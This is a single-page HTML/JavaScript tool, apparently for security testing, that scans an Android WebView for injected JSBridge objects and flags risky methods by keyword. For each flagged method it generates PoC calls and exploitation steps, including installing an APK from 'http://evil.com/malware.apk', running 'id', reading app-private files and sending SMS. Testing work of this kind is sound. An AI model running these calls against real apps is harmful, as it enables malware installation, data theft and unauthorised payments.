<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>JSBridge Scanner v5 - 漏洞检测版</title>
<style>
:root {
  --bg: #0f0f23; --card: #1a1a2e; --card-hover: #16213e;
  --text: #eee; --text-dim: #888;
  --blue: #00d4ff; --red: #ff4757; --yellow: #ffa502; --green: #2ed573;
  --purple: #a855f7; --orange: #ff7f50; --critical: #ff0040;
}
* { box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 0; font-size: 14px; }
.container { max-width: 900px; margin: 0 auto; padding: 15px; }

.header { text-align: center; padding: 20px 0 15px; }
.header h1 { margin: 0; font-size: 24px; color: var(--blue); font-weight: 700; }
.header .badge { background: var(--red); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 12px; margin-left: 8px; }
.header p { color: var(--text-dim); font-size: 13px; margin-top: 6px; }

/* 统计 */
.stats { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
.stat-box { flex: 1; min-width: 60px; background: var(--card); padding: 10px 6px; border-radius: 10px; text-align: center; cursor: pointer; }
.stat-box .count { font-size: 22px; font-weight: bold; display: block; }
.stat-box .label { font-size: 10px; color: var(--text-dim); }
.stat-box.critical .count { color: var(--critical); }
.stat-box.high .count { color: var(--red); }
.stat-box.medium .count { color: var(--yellow); }
.stat-box.safe .count { color: var(--green); }
.stat-box.total .count { color: var(--blue); }

/* 搜索 */
.search-box { margin-bottom: 15px; }
.search-input { width: 100%; padding: 10px 14px; border: 2px solid var(--card); border-radius: 8px; background: var(--card); color: var(--text); font-size: 14px; outline: none; }
.search-input:focus { border-color: var(--blue); }

/* 工具栏 */
.toolbar { display: flex; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; }
.tool-btn { padding: 8px 12px; border: none; border-radius: 6px; background: var(--card); color: var(--text); font-size: 12px; cursor: pointer; }
.tool-btn:hover { background: var(--card-hover); }
.tool-btn.primary { background: var(--blue); color: #000; }

/* 漏洞报告区 */
.vuln-panel { background: var(--card); border-radius: 12px; padding: 15px; margin-bottom: 15px; border-left: 4px solid var(--critical); }
.vuln-panel.none { border-left-color: var(--green); }
.vuln-title { font-size: 15px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
.vuln-title .icon { font-size: 18px; }

.vuln-item { background: var(--bg); border-radius: 8px; padding: 12px; margin-bottom: 10px; }
.vuln-item:last-child { margin-bottom: 0; }
.vuln-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
.vuln-type { font-size: 12px; padding: 3px 8px; border-radius: 4px; font-weight: 600; }
.vuln-type.critical { background: var(--critical); color: #fff; }
.vuln-type.high { background: var(--red); color: #fff; }
.vuln-type.medium { background: var(--yellow); color: #000; }
.vuln-name { font-weight: 600; font-family: monospace; }
.vuln-desc { color: var(--text-dim); font-size: 12px; margin-bottom: 8px; }

.vuln-poc { background: #000; border-radius: 6px; padding: 10px; font-family: monospace; font-size: 12px; color: var(--green); overflow-x: auto; margin-bottom: 8px; }
.vuln-steps { margin-top: 10px; }
.vuln-steps-title { font-size: 12px; font-weight: 600; color: var(--orange); margin-bottom: 6px; }
.vuln-steps ol { margin: 0; padding-left: 20px; font-size: 12px; line-height: 1.6; }
.vuln-steps li { margin-bottom: 4px; }

/* 接口列表 */
.results { margin-bottom: 20px; }
.item { background: var(--card); border-radius: 10px; margin-bottom: 10px; overflow: hidden; border-left: 4px solid transparent; }
.item.critical { border-left-color: var(--critical); }
.item.high { border-left-color: var(--red); }
.item.medium { border-left-color: var(--yellow); }
.item.safe { border-left-color: var(--green); }

.item-header { padding: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
.item-name { font-weight: 600; font-size: 14px; }
.item-type { color: var(--text-dim); font-size: 11px; background: var(--bg); padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
.item-right { display: flex; align-items: center; gap: 6px; }
.risk-tag { padding: 4px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; }
.risk-tag.critical { background: var(--critical); color: #fff; }
.risk-tag.high { background: var(--red); color: #fff; }
.risk-tag.medium { background: var(--yellow); color: #000; }
.risk-tag.safe { background: var(--green); color: #000; }
.arrow { font-size: 10px; color: var(--text-dim); }

.item-body { display: none; padding: 0 12px 12px; border-top: 1px solid var(--card-hover); }
.item.expanded .item-body { display: block; }

/* 方法列表 */
.method-list { max-height: 300px; overflow-y: auto; }
.method-item { padding: 8px; background: var(--bg); border-radius: 6px; margin-bottom: 6px; }
.method-row { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
.method-type { font-size: 10px; padding: 2px 5px; border-radius: 3px; background: var(--purple); color: #fff; }
.method-type.function { background: var(--blue); color: #000; }
.method-name { font-family: monospace; font-size: 12px; flex: 1; }
.method-btn { padding: 4px 8px; border: none; border-radius: 4px; font-size: 10px; cursor: pointer; background: var(--blue); color: #000; }
.method-btn.copy { background: var(--purple); color: #fff; }

/* 调用面板 */
.call-panel { margin-top: 12px; background: var(--bg); border-radius: 8px; padding: 12px; }
.call-title { font-size: 13px; font-weight: 600; margin-bottom: 10px; color: var(--blue); }
.call-section { margin-bottom: 12px; }
.call-section:last-child { margin-bottom: 0; }
.call-label { font-size: 11px; color: var(--text-dim); margin-bottom: 6px; }
.call-input-group { display: flex; gap: 6px; }
.call-input { flex: 1; padding: 8px; border: 1px solid var(--card); border-radius: 4px; background: var(--card); color: var(--text); font-size: 12px; font-family: monospace; }
.call-btn { padding: 8px 14px; border: none; border-radius: 4px; background: var(--blue); color: #000; font-weight: 600; cursor: pointer; }
.call-result { margin-top: 10px; padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
.call-result.success { background: rgba(46,213,115,0.1); border-left: 3px solid var(--green); }
.call-result.error { background: rgba(255,71,87,0.1); border-left: 3px solid var(--red); }
.call-result.info { background: rgba(0,212,255,0.1); border-left: 3px solid var(--blue); }

/* Modal */
.modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
.modal.show { display: flex; }
.modal-content { background: var(--card); border-radius: 12px; padding: 20px; max-width: 700px; width: 100%; max-height: 80vh; overflow: auto; }
.modal-title { font-size: 16px; font-weight: 600; margin-bottom: 12px; }
.modal-body { font-size: 11px; font-family: monospace; background: var(--bg); padding: 12px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow: auto; }
.modal-btn { width: 100%; padding: 10px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; margin-top: 10px; }
.modal-btn.primary { background: var(--blue); color: #000; }
.modal-btn.secondary { background: var(--card-hover); color: var(--text); }

.toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--card); color: var(--text); padding: 10px 20px; border-radius: 16px; font-size: 13px; z-index: 2000; opacity: 0; transition: opacity 0.3s; }
.toast.show { opacity: 1; }

.empty { text-align: center; color: var(--text-dim); padding: 30px; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>JSBridge Scanner v5<span class="badge">漏洞检测版</span></h1>
    <p>自动识别 JSBridge 注入 + 漏洞检测 + 利用分析</p>
  </div>

  <div class="stats" id="stats"></div>

  <!-- 漏洞报告区 -->
  <div class="vuln-panel" id="vuln-panel">
    <div class="vuln-title"><span class="icon">🚨</span> 漏洞检测结果</div>
    <div id="vuln-list">扫描中...</div>
  </div>

  <div class="search-box">
    <input type="text" class="search-input" id="search" placeholder="搜索接口或方法名称..." oninput="applySearch()">
  </div>

  <div class="toolbar">
    <button class="tool-btn" onclick="expandAll()">展开全部</button>
    <button class="tool-btn" onclick="collapseAll()">折叠全部</button>
    <button class="tool-btn" onclick="exportJSON()">导出JSON</button>
    <button class="tool-btn" onclick="exportReport()">导出报告</button>
    <button class="tool-btn primary" onclick="location.reload()">重新扫描</button>
  </div>

  <div class="results" id="results"></div>
</div>

<div class="modal" id="modal">
  <div class="modal-content">
    <div class="modal-title" id="modal-title"></div>
    <div class="modal-body" id="modal-body"></div>
    <button class="modal-btn primary" onclick="copyModal()">复制</button>
    <button class="modal-btn secondary" onclick="closeModal()">关闭</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
(function() {
// ===================== 1. 漏洞规则定义 =====================
const VULN_RULES = [
  {
    type: "任意代码执行",
    level: "critical",
    keywords: ["exec", "eval", "shell", "cmd", "execute", "runcommand"],
    desc: "可能存在任意代码执行风险",
    impact: "攻击者可执行任意系统命令，完全控制设备",
    getPoc: (fullName) => `${fullName}("id")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("id")`,
      "如果返回系统信息，说明可执行命令",
      "尝试其他命令: ls, cat /proc/version 等",
      "建议: 检查该方法是否做参数白名单校验"
    ]
  },
  {
    type: "APK安装",
    level: "critical",
    keywords: ["install", "installapk", "downloadapk", "apk"],
    desc: "可能存在静默安装APK风险",
    impact: "攻击者可诱导用户安装木马应用",
    getPoc: (fullName) => `${fullName}("http://evil.com/malware.apk")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("http://xxx/test.apk")`,
      "观察是否弹出安装确认框或直接安装",
      "如果能静默安装，属于严重漏洞",
      "建议: 检查是否有用户确认、来源限制"
    ]
  },
  {
    type: "支付漏洞",
    level: "critical",
    keywords: ["pay", "payment", "alipay", "wxpay", "wechatpay"],
    desc: "可能存在未授权支付风险",
    impact: "攻击者可发起未授权支付",
    getPoc: (fullName) => `${fullName}({amount: 0.01})`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}({amount: 1})`,
      "观察是否需要密码/指纹确认",
      "如果无确认直接支付，属于严重漏洞",
      "建议: 检查支付流程是否有二次验证"
    ]
  },
  {
    type: "短信劫持",
    level: "critical",
    keywords: ["sendsms", "sms", "sendsmessage"],
    desc: "可能存在短信发送/劫持风险",
    impact: "攻击者可发送扣费短信或劫持验证码",
    getPoc: (fullName) => `${fullName}({number: "10086", content: "test"})`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}({number: "10086", content: "test"})`,
      "观察是否发送短信",
      "建议: 检查是否有用户确认、号码限制"
    ]
  },
  {
    type: "任意文件读取",
    level: "high",
    keywords: ["readfile", "getfile", "openfile", "loadfile"],
    desc: "可能存在任意文件读取风险",
    impact: "攻击者可读取应用私有数据",
    getPoc: (fullName) => `${fullName}("/data/data/包名/")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("/data/data/")`,
      "尝试读取应用私有目录下的文件",
      `如: ${fullName}("/data/data/包名/shared_prefs/config.xml")`,
      "建议: 检查路径是否做限制"
    ]
  },
  {
    type: "任意文件写入",
    level: "high",
    keywords: ["writefile", "savefile", "createfile"],
    desc: "可能存在任意文件写入风险",
    impact: "攻击者可修改配置、植入后门",
    getPoc: (fullName) => `${fullName}("/sdcard/test.txt", "hack")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("/sdcard/test.txt", "content")`,
      "尝试写入到应用私有目录",
      "建议: 检查写入路径限制"
    ]
  },
  {
    type: "Intent注入",
    level: "high",
    keywords: ["intent", "startactivity", "startservice"],
    desc: "可能存在Intent注入风险",
    impact: "攻击者可启动任意Activity",
    getPoc: (fullName) => `${fullName}("intent://xxx")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("intent://xxx")`,
      "尝试启动其他App的Activity",
      "建议: 检查Intent目标是否做白名单"
    ]
  },
  {
    type: "URL劫持",
    level: "high",
    keywords: ["openurl", "loadurl", "open"],
    desc: "可能存在URL劫持风险",
    impact: "攻击者可打开恶意链接",
    getPoc: (fullName) => `${fullName}("http://evil.com")`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}("http://www.baidu.com")`,
      "观察是否能打开任意URL",
      "尝试Intent Scheme: intent://xxx",
      "建议: 检查URL白名单"
    ]
  },
  {
    type: "隐私泄露",
    level: "medium",
    keywords: ["imei", "imsi", "deviceid", "mac", "androidid", "token", "userinfo"],
    desc: "可能泄露敏感信息",
    impact: "攻击者可获取设备标识",
    getPoc: (fullName) => `var data = ${fullName}();`,
    getSteps: (fullName) => [
      `在控制台执行: var info = ${fullName}();`,
      "console.log(info) 查看返回内容",
      "建议: 检查是否需要授权"
    ]
  },
  {
    type: "定位泄露",
    level: "medium",
    keywords: ["location", "getlocation", "gps", "position"],
    desc: "可能泄露位置信息",
    impact: "攻击者可追踪用户位置",
    getPoc: (fullName) => `var loc = ${fullName}();`,
    getSteps: (fullName) => [
      `在控制台执行: var loc = ${fullName}();`,
      "console.log(loc) 查看位置",
      "建议: 检查是否有权限提示"
    ]
  },
  {
    type: "摄像头/相册",
    level: "medium",
    keywords: ["camera", "photo", "takephoto", "openCamera"],
    desc: "可能调用摄像头/相册",
    impact: "可能被用于偷拍",
    getPoc: (fullName) => `${fullName}();`,
    getSteps: (fullName) => [
      `在控制台执行: ${fullName}()`,
      "观察是否有UI提示",
      "建议: 确保有明显的拍照/选择提示"
    ]
  },
  {
    type: "通讯录泄露",
    level: "medium",
    keywords: ["contact", "addressbook", "getcontacts", "showAddressBook"],
    desc: "可能获取通讯录",
    impact: "攻击者可获取联系人信息",
    getPoc: (fullName) => `var contacts = ${fullName}();`,
    getSteps: (fullName) => [
      `在控制台执行: var contacts = ${fullName}();`,
      "console.log(contacts) 查看返回内容",
      "建议: 检查是否有授权提示"
    ]
  }
];

// ===================== 2. 基线检测 =====================
function getInjectedProps() {
  try {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const cleanWindow = iframe.contentWindow;
    const current = Object.getOwnPropertyNames(window);
    const clean = Object.getOwnPropertyNames(cleanWindow);
    document.body.removeChild(iframe);
    return current.filter(p => !clean.includes(p));
  } catch(e) {
    const baseline = ["postMessage","blur","focus","close","parent","opener","top","length","frames","closed","location","self","window","document","name","customElements","history","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","clientInformation","screenLeft","screenTop","defaultStatus","defaultstatus","styleMedia","isSecureContext","performance","stop","open","alert","confirm","prompt","print","queueMicrotask","requestAnimationFrame","cancelAnimationFrame","captureEvents","releaseEvents","requestIdleCallback","cancelIdleCallback","getComputedStyle","matchMedia","moveTo","moveBy","resizeTo","resizeBy","scroll","scrollTo","scrollBy","getSelection","find","webkitRequestAnimationFrame","webkitCancelAnimationFrame","fetch","btoa","atob","setTimeout","clearTimeout","setInterval","clearInterval","createImageBitmap","onappinstalled","onbeforeinstallprompt","crypto","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","indexedDB","webkitStorageInfo","sessionStorage","localStorage","orientation","onorientationchange","openDatabase","ontouchcancel","ontouchend","ontouchmove","ontouchstart","TEMPORARY","PERSISTENT","addEventListener","removeEventListener","dispatchEvent"];
    const result = [];
    for (const key in window) {
      if (!baseline.includes(key) && !key.startsWith("on") && !key.startsWith("webkit")) {
        result.push(key);
      }
    }
    return result;
  }
}

// ===================== 3. JSBridge识别 =====================
function isLikelyBridge(obj) {
  if (!obj) return false;
  try {
    const type = typeof obj;
    if (type === "function") return true;
    if (type !== "object") return false;
    const keys = Object.keys(obj);
    if (keys.length === 0 || keys.length > 100) return false;
    return keys.some(k => typeof obj[k] === "function");
  } catch(e) {
    return false;
  }
}

// ===================== 4. 风险分析 =====================
function analyzeRisk(name) {
  const str = name.toLowerCase();
  for (const rule of VULN_RULES) {
    for (const kw of rule.keywords) {
      if (str.includes(kw.toLowerCase())) {
        return { level: rule.level, rule: rule, keyword: kw };
      }
    }
  }
  return { level: "safe", rule: null, keyword: null };
}

// ===================== 5. 扫描执行 =====================
const injectedProps = getInjectedProps();
const scanResults = [];
const vulnResults = [];

for (const key of injectedProps) {
  const obj = window[key];
  const type = typeof obj;
  
  if (!isLikelyBridge(obj)) continue;
  
  const methods = [];
  const objRisk = analyzeRisk(key);
  let maxRisk = objRisk.level;
  
  if (obj && (type === "object" || type === "function")) {
    for (const prop in obj) {
      try {
        const propType = typeof obj[prop];
        const propRisk = analyzeRisk(prop);
        
        if (propRisk.level !== "safe") {
          const fullName = `${key}.${prop}`;
          const poc = propRisk.rule.getPoc(fullName);
          const steps = propRisk.rule.getSteps(fullName);
          
          vulnResults.push({
            name: fullName,
            type: propRisk.rule.type,
            level: propRisk.level,
            desc: propRisk.rule.desc,
            impact: propRisk.rule.impact,
            poc: poc,
            steps: steps,
            keyword: propRisk.keyword
          });
        }
        
        if (propRisk.level === "critical") maxRisk = "critical";
        else if (propRisk.level === "high" && maxRisk !== "critical") maxRisk = "high";
        else if (propRisk.level === "medium" && maxRisk !== "critical" && maxRisk !== "high") maxRisk = "medium";
        
        methods.push({
          name: prop,
          type: propType,
          risk: propRisk.level,
          keyword: propRisk.keyword
        });
      } catch(e) {}
    }
  }
  
  scanResults.push({
    name: key,
    type: type,
    risk: maxRisk,
    methods: methods
  });
}

// 排序
const order = { critical: 0, high: 1, medium: 2, safe: 3 };
scanResults.sort((a, b) => order[a.risk] - order[b.risk]);
vulnResults.sort((a, b) => order[a.level] - order[b.level]);

// ===================== 6. 统计 =====================
const counts = { critical: 0, high: 0, medium: 0, safe: 0, total: scanResults.length };
scanResults.forEach(r => counts[r.risk]++);
const vulnCounts = { critical: 0, high: 0, medium: 0 };
vulnResults.forEach(v => vulnCounts[v.level]++);

// 全局变量
window.scanResults = scanResults;
window.vulnResults = vulnResults;

// ===================== 7. 渲染UI =====================
document.getElementById("stats").innerHTML = `
  <div class="stat-box total" onclick="filterByRisk('all')"><span class="count">${counts.total}</span><span class="label">总计</span></div>
  <div class="stat-box critical" onclick="filterByRisk('critical')"><span class="count">${counts.critical}</span><span class="label">严重</span></div>
  <div class="stat-box high" onclick="filterByRisk('high')"><span class="count">${counts.high}</span><span class="label">高危</span></div>
  <div class="stat-box medium" onclick="filterByRisk('medium')"><span class="count">${counts.medium}</span><span class="label">中危</span></div>
  <div class="stat-box safe" onclick="filterByRisk('safe')"><span class="count">${counts.safe}</span><span class="label">安全</span></div>
`;

// 渲染漏洞报告
const vulnPanel = document.getElementById("vuln-panel");
const vulnList = document.getElementById("vuln-list");

if (vulnResults.length === 0) {
  vulnPanel.classList.add("none");
  vulnPanel.querySelector(".vuln-title").innerHTML = '<span class="icon">✅</span> 未发现明显漏洞';
  vulnList.innerHTML = "<div style='color:var(--text-dim);font-size:12px;'>未检测到高风险接口，但不代表绝对安全。</div>";
} else {
  vulnList.innerHTML = vulnResults.map(v => `
    <div class="vuln-item">
      <div class="vuln-header">
        <span class="vuln-type ${v.level}">${v.type}</span>
        <span class="vuln-name">${v.name}</span>
      </div>
      <div class="vuln-desc">${v.desc} - ${v.impact}</div>
      <div class="vuln-poc">PoC: ${v.poc}</div>
      <div class="vuln-steps">
        <div class="vuln-steps-title">🔍 利用流程：</div>
        <ol>${v.steps.map(s => `<li>${s}</li>`).join("")}</ol>
      </div>
    </div>
  `).join("");
}

// 渲染接口列表
let currentFilter = "all";
renderResults(currentFilter);

function renderResults(filter) {
  currentFilter = filter;
  let list = filter === "all" ? scanResults : scanResults.filter(r => r.risk === filter);
  const search = document.getElementById("search").value.toLowerCase();
  if (search) {
    list = list.filter(r => 
      r.name.toLowerCase().includes(search) || 
      r.methods.some(m => m.name.toLowerCase().includes(search))
    );
  }
  
  const container = document.getElementById("results");
  if (!list.length) {
    container.innerHTML = '<div class="empty">没有找到匹配的接口</div>';
    return;
  }
  
  container.innerHTML = list.map((item, idx) => `
    <div class="item ${item.risk}" data-idx="${idx}">
      <div class="item-header" onclick="toggleItem(${idx})">
        <div>
          <span class="item-name">${item.name}</span>
          <span class="item-type">${item.type}</span>
        </div>
        <div class="item-right">
          <span class="risk-tag ${item.risk}">${item.risk.toUpperCase()}</span>
          <span class="arrow">▼</span>
        </div>
      </div>
      <div class="item-body">
        <div class="method-list">
          ${item.methods.map((m, mIdx) => `
            <div class="method-item">
              <div class="method-row">
                <span class="method-type ${m.type === 'function' ? 'function' : ''}">${m.type}</span>
                <span class="method-name" style="${m.risk !== 'safe' ? 'color:var(--' + m.risk + ')' : ''}">${m.name}</span>
                ${m.risk !== 'safe' ? `<span class="risk-tag ${m.risk}" style="font-size:9px;padding:2px 5px;">${m.risk}</span>` : ''}
                <button class="method-btn" onclick="copyText('${item.name}.${m.name}')">复制</button>
              </div>
            </div>
          `).join("")}
        </div>
        
        <div class="call-panel">
          <div class="call-title">🔧 调用测试</div>
          <div class="call-section">
            <div class="call-label">输入参数（JSON格式或字符串），点击执行调用</div>
            <div class="call-input-group">
              <input type="text" class="call-input" id="call-input-${idx}" placeholder='如: {"key":"value"} 或 直接字符串'>
              <button class="call-btn" onclick="customCall('${item.name}', ${idx})">执行</button>
            </div>
            <div style="margin-top:8px;">
              <button class="method-btn" onclick="tryNoArgsCall('${item.name}', ${idx})">无参调用</button>
              <button class="method-btn" onclick="showObjInfo('${item.name}', ${idx})">查看详情</button>
            </div>
          </div>
          <div class="call-result" id="call-result-${idx}" style="display:none;"></div>
        </div>
      </div>
    </div>
  `).join("");
}

window.renderResults = renderResults;

window.filterByRisk = function(risk) {
  document.getElementById("search").value = "";
  renderResults(risk);
};

window.applySearch = function() {
  renderResults(currentFilter);
};

window.toggleItem = function(idx) {
  const item = document.querySelector(`.item[data-idx="${idx}"]`);
  if (item) item.classList.toggle("expanded");
};

window.expandAll = function() {
  document.querySelectorAll('.item').forEach(el => el.classList.add('expanded'));
};

window.collapseAll = function() {
  document.querySelectorAll('.item').forEach(el => el.classList.remove('expanded'));
};

// ===================== 8. 调用函数 =====================
window.customCall = function(objName, idx) {
  const input = document.getElementById(`call-input-${idx}`)?.value || "";
  const resultDiv = document.getElementById(`call-result-${idx}`);
  resultDiv.style.display = "block";
  resultDiv.className = "call-result info";
  resultDiv.textContent = "执行中...";

  setTimeout(() => {
    try {
      const obj = window[objName];
      const type = typeof obj;
      
      if (type === "function") {
        let args = [];
        if (input.trim()) {
          try { args = [JSON.parse(input)]; } catch { args = [input]; }
        }
        const result = obj.apply(null, args);
        resultDiv.className = "call-result success";
        resultDiv.textContent = `✓ 调用成功\n返回类型: ${typeof result}\n返回值: ${JSON.stringify(result, null, 2) || String(result)}`;
      } else if (type === "object") {
        resultDiv.className = "call-result info";
        resultDiv.textContent = `对象信息:\n类型: ${type}\n属性数: ${Object.keys(obj).length}\nJSON: ${JSON.stringify(obj, null, 2).slice(0, 500)}`;
      } else {
        resultDiv.className = "call-result success";
        resultDiv.textContent = `值: ${String(obj)}`;
      }
    } catch(err) {
      resultDiv.className = "call-result error";
      resultDiv.textContent = `✗ 执行失败\n错误: ${err.message}`;
    }
  }, 50);
};

window.tryNoArgsCall = function(objName, idx) {
  const resultDiv = document.getElementById(`call-result-${idx}`);
  resultDiv.style.display = "block";
  resultDiv.className = "call-result info";
  resultDiv.textContent = "尝试无参调用...";

  setTimeout(() => {
    try {
      const obj = window[objName];
      if (typeof obj === "function") {
        const result = obj();
        resultDiv.className = "call-result success";
        resultDiv.textContent = `✓ 无参调用成功\n返回: ${JSON.stringify(result, null, 2) || String(result)}`;
      } else {
        resultDiv.className = "call-result info";
        resultDiv.textContent = `这是一个 ${typeof obj} 类型，不是函数`;
      }
    } catch(err) {
      resultDiv.className = "call-result error";
      resultDiv.textContent = `✗ 无参调用失败\n错误: ${err.message}`;
    }
  }, 50);
};

window.showObjInfo = function(objName, idx) {
  const resultDiv = document.getElementById(`call-result-${idx}`);
  resultDiv.style.display = "block";

  try {
    const obj = window[objName];
    const info = { 类型: typeof obj };
    if (typeof obj === "function") {
      info.函数代码 = obj.toString().slice(0, 300);
    }
    if (obj && typeof obj === "object") {
      info.可枚举属性 = Object.keys(obj);
    }
    resultDiv.className = "call-result success";
    resultDiv.textContent = `对象详情:\n${JSON.stringify(info, null, 2)}`;
  } catch(err) {
    resultDiv.className = "call-result error";
    resultDiv.textContent = `获取信息失败: ${err.message}`;
  }
};

window.copyText = function(text) {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text);
  } else {
    const ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
  }
  showToast("已复制: " + text);
};

// ===================== 9. 导出 =====================
window.exportJSON = function() {
  const data = {
    scanTime: new Date().toISOString(),
    url: location.href,
    userAgent: navigator.userAgent,
    vulnCount: vulnResults.length,
    results: scanResults.map(r => ({
      name: r.name,
      type: r.type,
      risk: r.risk,
      methods: r.methods.map(m => ({ name: m.name, type: m.type, risk: m.risk }))
    })),
    vulns: vulnResults.map(v => ({
      name: v.name,
      type: v.type,
      level: v.level,
      desc: v.desc,
      poc: v.poc,
      steps: v.steps
    }))
  };
  showModal("导出JSON", JSON.stringify(data, null, 2));
};

window.exportReport = function() {
  let md = `# JSBridge 漏洞检测报告\n\n`;
  md += `**扫描时间:** ${new Date().toLocaleString()}\n`;
  md += `**页面:** ${location.href}\n\n`;
  
  md += `## 统计\n`;
  md += `- 总接口: ${counts.total}\n`;
  md += `- 严重: ${counts.critical}\n`;
  md += `- 高危: ${counts.high}\n`;
  md += `- 中危: ${counts.medium}\n`;
  md += `- 安全: ${counts.safe}\n\n`;
  
  md += `## 漏洞发现 (${vulnResults.length}个)\n\n`;
  vulnResults.forEach(v => {
    md += `### ${v.name} [${v.level.toUpperCase()}]\n`;
    md += `- **类型:** ${v.type}\n`;
    md += `- **描述:** ${v.desc}\n`;
    md += `- **影响:** ${v.impact}\n`;
    md += `- **PoC:** \`${v.poc}\`\n`;
    md += `- **利用步骤:**\n`;
    v.steps.forEach((s, i) => md += `  ${i+1}. ${s}\n`);
    md += `\n`;
  });
  
  md += `## 接口详情\n\n`;
  scanResults.forEach(item => {
    md += `### ${item.name} (${item.risk})\n`;
    item.methods.forEach(m => {
      md += `- \`${m.name}\` [${m.type}]`;
      if (m.risk !== "safe") md += ` ⚠️${m.risk}`;
      md += `\n`;
    });
    md += `\n`;
  });
  
  showModal("导出报告", md);
};

window.showModal = function(title, content) {
  document.getElementById("modal-title").textContent = title;
  document.getElementById("modal-body").textContent = content;
  document.getElementById("modal").classList.add("show");
};

window.closeModal = function() {
  document.getElementById("modal").classList.remove("show");
};

window.copyModal = function() {
  const text = document.getElementById("modal-body").textContent;
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text);
  } else {
    const ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
  }
  showToast("已复制到剪贴板");
};

function showToast(msg) {
  const toast = document.getElementById("toast");
  toast.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2000);
}

// 扫描完成提示
setTimeout(() => {
  let msg = `扫描完成!\n\n`;
  msg += `发现 ${scanResults.length} 个JSBridge接口\n`;
  msg += `其中 ${vulnResults.length} 个存在潜在漏洞\n\n`;
  if (vulnCounts.critical > 0) msg += `🚨 严重漏洞: ${vulnCounts.critical}个\n`;
  if (vulnCounts.high > 0) msg += `⚠️ 高危漏洞: ${vulnCounts.high}个\n`;
  if (vulnCounts.medium > 0) msg += `⚡ 中危漏洞: ${vulnCounts.medium}个\n`;
  alert(msg);
}, 100);

})();
</script>
</body>
